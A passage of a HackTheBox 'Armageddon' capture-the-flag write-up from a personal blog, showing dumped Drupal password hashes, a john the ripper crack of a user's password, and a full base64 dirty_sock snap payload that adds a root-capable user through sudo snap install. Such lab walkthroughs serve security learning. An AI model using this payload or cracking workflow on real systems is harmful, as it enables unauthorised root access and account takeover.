+amh     <span class="nv">$S$Dmm4uC50HPYqMB</span>/UsqakJwQ0..gxtm56FrjXke2Mx4fgnzFhP2m7
+SLifer  <span class="nv">$S$DEOAUQ8</span>.C5La53ZvqLd70hzC9Rl5eImVhHu2t4OG51jae3hqb/fg
+Slifer1 <span class="nv">$S$Dd3AkZANm00KS6eQp3mAZlN0zLRw3qgr3bfTVdHM5Z</span>/coLvLlKn3
+yen     <span class="nv">$S$Dt6dXaen3pqmFLUJNdLrRpdC76EYBPWLG</span>..R9iHFN7Zc8QlPp0gu
+moneys  <span class="nv">$S$D8BTmF7XZs3p6eJyFFvtNUkP8KUtCQmHS8G3Sx51GlaCRT5Xu4QZ</span>
+yen12345678     <span class="nv">$S$DIJeT4SLhs6nXlhkU70j9KdzP46Y</span>.zMKch2TN89V5FqWD8c4X98B
+yen123456789    <span class="nv">$S$D1u</span>.0AX0xKFfUL5rjiKXnZL4FvBvmUYsiWWtjQSaPo8tWxmU5UR7
+yen2111199      <span class="nv">$S$D9H0ULruyXbGu</span>/U2rTDjt69qzJzZKrj2Rzq8A9jxCHOs77wV6lQ2
+moneysax        <span class="nv">$S$DGl1I7LqED</span>/V5u9Gocc9cvAzoaxHGLwfhHvQYzxcoT3ODkHE9vta
+daemon  <span class="nv">$S$DCZUcQX9DRPjobVwOcmwrALQ9wqYRepEDq6K</span>.Oa0SvLlDC2seO6D
+</code></pre></div></div>
+<h2 id="password-cracking">Password cracking</h2>
+<p>Cracking the hash with the help of <code class="language-plaintext highlighter-rouge">john the ripper</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john user_hash.txt <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 14 password hashes with 5 different salts <span class="o">(</span>Drupal7, <span class="nv">$S$ </span><span class="o">[</span>SHA512 256/256 AVX2 4x]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 32768 <span class="k">for </span>all loaded hashes
+Will run 8 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+booboo           <span class="o">(</span>?<span class="o">)</span>
+</code></pre></div></div>
+<p>Got the password for the user <code class="language-plaintext highlighter-rouge">brucetherealadmin</code> <code class="language-plaintext highlighter-rouge">booboo</code>.</p>
+
+<p>Trying to <code class="language-plaintext highlighter-rouge">switch user</code> using <code class="language-plaintext highlighter-rouge">su</code> command but it keeps failing. Trying with <code class="language-plaintext highlighter-rouge">SSH</code> with the user name and the password.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329174515.png" alt=""></p>
+<h2 id="getting-usertxt">Getting User.txt</h2>
+<p><img src="/assets/img/sample/armageddon/Pasted%20image%2020210329180335.png" alt="">
+Checking the privileges of the user using <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>brucetherealadmin on armageddon:
+    <span class="o">!</span>visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, <span class="nv">env_keep</span><span class="o">=</span><span class="s2">"COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS"</span>, env_keep+<span class="o">=</span><span class="s2">"MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE"</span>,
+    env_keep+<span class="o">=</span><span class="s2">"LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE"</span>, env_keep+<span class="o">=</span><span class="s2">"LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY"</span>,
+    <span class="nv">secure_path</span><span class="o">=</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin
+
+User brucetherealadmin may run the following commands on armageddon:
+    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/snap <span class="nb">install</span> <span class="k">*</span>
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Searching for the string <code class="language-plaintext highlighter-rouge">(root) NOPASSWD: /usr/bin/snap install *</code> found this link is helpful. 
+<a href="https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py">https://github.com/initstring/dirty_sock/blob/master/dirty_sockv2.py</a></p>
+
+<p>Just using a small piece of the python exploit, we can elevate our permission.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>brucetherealadmin@armageddon ~]<span class="nv">$ </span>python2 <span class="nt">-c</span> <span class="s1">'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD//////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5TGJ2RzN2Rnp6SFJqWGZCWUswU09HZk1EMXNMeWFTOTdBd25KVXM3Z0RDWS5mZzE5TnMzSndSZERoT2NFbURwQlZsRjltLicgLXMgL2Jpbi9iYXNoCnVzZXJtb2QgLWFHIHN1ZG8gZGlydHlfc29jawplY2hvICJkaXJ0eV9zb2NrICAgIEFMTD0oQUxMOkFMTCkgQUxMIiA+PiAvZXRjL3N1ZG9lcnMKbmFtZTogZGlydHktc29jawp2ZXJzaW9uOiAnMC4xJwpzdW1tYXJ5OiBFbXB0eSBzbmFwLCB1c2VkIGZvciBleHBsb2l0CmRlc2NyaXB0aW9uOiAnU2VlIGh0dHBzOi8vZ2l0aHViLmNvbS9pbml0c3RyaW5nL2RpcnR5X3NvY2sKCiAgJwphcmNoaXRlY3R1cmVzOgotIGFtZDY0CmNvbmZpbmVtZW50OiBkZXZtb2RlCmdyYWRlOiBkZXZlbAqcAP03elhaAAABaSLeNgPAZIACIQECAAAAADopyIngAP8AXF0ABIAerFoU8J/e5+qumvhFkbY5Pr4ba1mk4+lgZFHaUvoa1O5k6KmvF3FqfKH62aluxOVeNQ7Z00lddaUjrkpxz0ET/XVLOZmGVXmojv/IHq2fZcc/VQCcVtsco6gAw76gWAABeIACAAAAaCPLPz4wDYsCAAAAAAFZWowA/Td6WFoAAAFpIt42A8BTnQEhAQIAAAAAvhLn0OAAnABLXQAAan87Em73BrVRGmIBM8q2XR9JLRjNEyz6lNkCjEjKrZZFBdDja9cJJGw1F0vtkyjZecTuAfMJX82806GjaLtEv4x1DNYWJ5N5RQAAAEDvGfMAAWedAQAAAPtvjkc+MA2LAgAAAAABWVo4gIAAAAAAAAAAPAAAAAAAAAAAAAAAAAAAAFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" + "A"*4256 + "=="'</span> | <span class="nb">base64</span> <span class="nt">-d</span> <span class="o">&gt;</span> DcodeZero.snap
+</code></pre></div></div>
+<p><img src="/assets/img/sample/armageddon/Pasted%20image%2020210329180245.png" alt=""></p>
+
+<p><img src="/assets/img/sample/armageddon/Pasted%20image%2020210329180832.png" alt=""></p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">sudo</span> /usr/bin/snap <span class="nb">install</span> <span class="nt">--devmode</span> DcodeZero.snap
+</code></pre></div></div>
+
+<p>As seen, the user dirty_sock has been created. Time for priv esc.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329181324.png" alt=""></p>
+
+<p>Using the user name <code class="language-plaintext highlighter-rouge">dirty_sock</code> and password <code class="language-plaintext highlighter-rouge">dirty_sock</code> we login as dirty_sock.
+Checking the permission of the user <code class="language-plaintext highlighter-rouge">dirty_sock</code>. using <code class="language-plaintext highlighter-rouge">sudo -i</code>.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329181558.png" alt="">
+As I see <code class="language-plaintext highlighter-rouge">(ALL : ALL) ALL</code>. Time for <code class="language-plaintext highlighter-rouge">#root</code>.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329181732.png" alt="">
+Getting the <code class="language-plaintext highlighter-rouge">Root.txt</code> file.
+<img src="/assets/img/sample/armageddon/Pasted%20image%2020210329181833.png" alt=""></p>
+
+<p>Machine Pwned Successfully.</p>
+
+
+
+    </div>
+
+</article>
+<div class="post-nav">
+<a class="previous" href="/otherposts/2020/10/17/OSCP.html" title='My  journey  towards  "TRY  HARDER!"'>My  journey  towards  "TRY  HARDER!"</a><span></span>
+</div>
+<div class="post-related">
+      <div>Related Articles</div>
+      <ul>
+        <li><a class="post-link" href="/hackthebox/retired/2020/03/13/Bashed.html" title="">HackTheBox Bashed</a></li>
+<li><a class="post-link" href="/hackthebox/2020/06/30/Blunder.html" title="">HackTheBox Blunder</a></li>
+<li><a class="post-link" href="/hackthebox/retired/2020/06/12/Monteverde.html" title="">HackTheBox Monteverde</a></li>
+<li><a class="post-link" href="/hackthebox/retired/2020/04/19/Forest.html" title="">HackTheBox Forest</a></li>
+</ul>
+    </div>
+<div class="post-comments"></div></section>
+</div>
+
+
+  </section>
+  <section class="sidebar" style="margin-left: 15px;">
+    <!-- Get sidebar items --><style type="text/css" media="screen">
+.post-menu ul {
+  list-style: none;
+  padding: 0;
+  margin: 0;
+}
+</style>
+
+<div class="post-menu">
+  <div class="post-menu-title"> Contents</div>
+  <div class="post-menu-content"></div>
+</div>
+
+<script>
+  function generateContent() {
+    var menu = document.querySelector(".post-menu");
+    var menuContent =  menu.querySelector(".post-menu-content");
+    var headings = document.querySelector(".post-content").querySelectorAll("h2, h3, h4, h5, h6");
+
+    // Hide menu when no headings
+    if (headings.length === 0) {
+      return menu.style.display = "none";
+    }
+
+    // Generate post menu
+    var menuHTML = '';
+    for (var i = 0; i < headings.length; i++) {
+      var h = headings[i];
+      menuHTML += (
+        '<li class="h-' + h.tagName.toLowerCase() + '">'
+        + '<a href="#h-' + h.getAttribute('id') + '">' + h.textContent + '</a></li>');
+    }
+
+    menuContent.innerHTML = '<ul>' + menuHTML + '</ul>';
+
+    // The header element
+    var header = document.querySelector('header.site-header');
+
+    function doMenuCollapse(index, over_items) {
+      var items = menuContent.firstChild.children;
+
+      if (over_items == undefined) {
+        over_items = 20;
+      }
+
+      if (items.length < over_items) {
+        return;
+      }
+
+      var activeItem = items[index];
+      var beginItem = activeItem
+      var endItem = activeItem
+      var beginIndex = index;
+      var endIndex = index + 1;
+      while (beginIndex >= 0
+        && !items[beginIndex].classList.contains('h-h2')) {
+        beginIndex -= 1;
+      }
+      while (endIndex < items.length
+        && !items[endIndex].classList.contains('h-h2')) {
+        endIndex += 1;
+      }
+      for (var i = 0; i < beginIndex; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+      for (var i = beginIndex + 1; i < endIndex; i++) {
+        item = items[i]
+        // if (!item.classList.contains('h-h2')) {
+          item.style.display = '';
+        // }
+      }
+      for (var i = endIndex; i < items.length; i++) {
+        item = items[i]
+        if (!item.classList.contains('h-h2')) {
+          item.style.display = 'none';
+        }
+      }
+    }
+
+    // Init menu collapsed
+    doMenuCollapse(-1);
+
+    // Active the menu item
+    window.addEventListener('scroll', function (event) {
+      var lastActive = menuContent.querySelector('.active');
+      var changed = true;
+      var activeIndex = -1;
+      for (var i = headings.length - 1; i >= 0; i--) {
+        var h = headings[i];
+        var headingRect = h.getBoundingClientRect();
+        var headerRect = header.getBoundingClientRect();
+        var headerTop = Math.floor(headerRect.top);
+        var headerHeight = Math.floor(headerRect.height);
+        var headerHeight = headerTop + headerHeight + 20;
+        if (headingRect.top <= headerHeight) {
+          var id = 'h-' + h.getAttribute('id');
+          var a = menuContent.querySelector('a[href="#' + id  + '"]');
+          var curActive = a.parentNode;
+          if (curActive) {
+            curActive.classList.add('active');
+            activeIndex = i;
+          }
+          if (lastActive == curActive) {
+            changed = false;
+          }
+          break;
+        }
+      }
+      if (changed) {
+        if (lastActive) {
+          lastActive.classList.remove('active');
+        }
+        doMenuCollapse(activeIndex);
+      }
+      event.preventDefault();
+    });
+  }
+  generateContent();
+</script>
+</section>
+</div>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+    <div class="site-footer-inner">
+      <div>Copyright © 2020-2022 @Jeevan</div>
+      <div>Powered by <a title="Jekyll is a simple, blog-aware, static site
+      generator." href="http://jekyllrb.com/">Jekyll</a> &amp; <a title="Yat, yet
+      another theme." href="https://github.com/jeffreytse/jekyll-theme-yat">Yat Theme</a>.</div>
+      
+    </div>
+  </div>
+</footer>
+</body>
+</html>
